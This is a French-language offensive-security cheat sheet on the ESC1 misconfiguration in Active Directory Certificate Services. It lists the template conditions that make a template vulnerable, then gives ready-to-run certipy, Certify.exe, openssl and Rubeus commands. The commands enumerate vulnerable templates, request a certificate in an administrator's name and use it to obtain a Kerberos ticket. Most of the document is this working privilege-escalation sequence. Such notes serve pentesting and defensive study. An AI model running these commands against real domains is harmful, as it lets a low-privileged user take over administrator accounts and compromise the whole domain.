### Description

ESC1 exploite des modèles de certificats mal configurés qui permettent à un utilisateur de demander un certificat pour un autre utilisateur, typiquement un administrateur.

### Conditions vulnérables

Un modèle de certificat est vulnérable à ESC1 si :

1. **Authentification client activée** - Le modèle permet l'authentification (`Client Authentication` ou `Smart Card Logon`)
2. **Enrollment autorisé** - L'utilisateur a les droits `Enroll` ou `AutoEnroll`
3. **Subject Name contrôlable** - Une des conditions suivantes :
    - `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` est activé
    - `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME` est activé
4. **Pas de signatures requises** - `CT_FLAG_PEND_ALL_REQUESTS` n'est pas activé

---
### Exploitation depuis linux (certipy)

Enumération des templates vulnérables :

```bash
certipy find -u user@domain.local -p password -target dc01.domain.local

# Énumération avec sortie JSON pour analyse 
certipy find -u user@domain.local -p password -target dc01.domain.local -json -output vulnerabilities.json 

# Énumération avec authentification NTLM 
certipy find -u user -H ntlm_hash -target dc01.domain.local
```

Faire la demande de certificat :

```bash
# Demande d'un certificat pour un administrateur 
certipy req -u user@domain.local -p password -target dc01.domain.local \ -ca 'domain-DC01-CA' -template 'VulnerableTemplate' \ -upn administrator@domain.local 

# Avec un nom de domaine spécifique 
certipy req -u user@domain.local -p password -target dc01.domain.local \ -ca 'domain-DC01-CA' -template 'VulnerableTemplate' \ -upn administrator@domain.local -dns dc01.domain.local
```

Authentification avec le certificat reçu :

```bash
# Récupération du TGT avec le certificat 
certipy auth -pfx administrator.pfx -username administrator -domain domain.local \ -dc-ip 192.168.1.10 

# Avec un mot de passe pour le certificat 
certipy auth -pfx administrator.pfx -password cert_password \ -username administrator -domain domain.local -dc-ip 192.168.1.10
```

---

### Exploitation depuis windows (certify.exe)

Enumération des templates vulnérables :

```powershell
# Énumération des modèles vulnérables 
Certify.exe find /vulnerable 

# Recherche spécifique ESC1 
Certify.exe find /vulnerable /currentuser
```

Faire la demande de certificat :

```powershell
# Demande d'un certificat pour un admin 
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:VulnerableTemplate /altname:administrator@domain.local 

# Avec un SAN spécifique 
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:VulnerableTemplate /subject:"CN=Administrator,CN=Users,DC=domain,DC=local"
```

Authentification avec le certificat reçu :

```powershell
# Conversion du certificat 
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx 

# Authentification avec le certificat 
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:password123 /ptt
```